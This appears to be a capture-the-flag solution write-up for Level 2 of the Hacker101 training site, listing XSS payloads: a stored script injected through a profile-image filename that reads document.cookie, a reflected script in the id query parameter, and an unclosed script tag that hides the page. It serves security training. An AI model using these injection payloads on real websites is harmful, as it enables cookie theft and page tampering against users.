# Level 2: Breaker Profile

```
		In this level, there are 7 vulnerabilities, falling into the following classes:
		Stored XSS
		Reflected XSS
		Unrelated Bonus

		Have fun!
```
    
## Stored XSS:
`.png"</body><script>alert(document.cookie)</script>.png`      
Save this as your profile image to return a broken page with Stored XSS.    
It is called once upon loading profile and twice when editing profile.    
![Stored XSS img](https://github.com/Isopach/Hacker101/blob/master/img/level2_stored_xss_img.png)

---

## Reflected XSS:    
`https://levels-a.hacker101.com/levels/2/?id=%3Cscript%3Ealert(1)%3C/script%3E`      
Append `<script>alert(1)</script>` in the id query for Reflected XSS     
![Reflected XSS](https://github.com/Isopach/Hacker101/blob/master/img/level2_reflected_xss.png)

---

## Unrelated Bonus(?):    
`.png"</body><script>.png`    
Don't close the script tag to hide the entire page. Replace the fields like in Level0.      
But no malicious activity be found from it - is it really a vulnerability?

![Hide Profile](https://github.com/Isopach/Hacker101/blob/master/img/level2_hide_profile.png)
